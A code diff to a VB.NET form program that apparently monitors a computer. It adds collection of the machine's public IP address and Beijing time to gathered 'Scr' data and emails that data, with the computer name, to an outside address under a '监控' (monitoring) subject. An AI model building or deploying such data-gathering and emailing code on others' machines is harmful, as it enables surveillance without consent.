@@ -18,6 +18,7 @@ Public Class Form1
 
     Dim WatchTh As Thread = New Thread(AddressOf GetScr)
     Dim SendTh As Thread = New Thread(AddressOf SendSCr)
+    Dim ipa As String = ""
     Dim Scr64 As String
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
@@ -26,6 +27,9 @@ Public Class Form1
     End Sub
 
     Private Sub GetScr()
+        Dim ips As New 在线IP地址
+        ipa = ips.原文
+        Scr64 = ipa + "  " + 北京时间(Now) + vbCrLf
         Dim i As Integer
         Dim m1 As String = ""
         Dim m2 As String = ""
@@ -47,14 +51,17 @@ Public Class Form1
     Private Sub SendSCr()
         If Scr64.Length > 10 Then
             Dim i As String = Scr64
-            Scr64 = String.Empty
-            发QQ邮件("1464076075@qq.com", "b", "gordonwalkedby@foxmail.com", My.Computer.Name + "  " + 北京时间(Now).ToString, i, True)
+            Scr64 = ipa + "  " + 北京时间(Now) + vbCrLf
+            发QQ邮件("1464076075@qq.com", "b", "watch@gordonw.top", "监控：" + My.Computer.Name, i, True)
         End If
     End Sub
 
     Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         If SendTh.IsAlive Then SendTh.Abort()
         If WatchTh.IsAlive Then WatchTh.Abort()
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
     End Sub
 
 End Class
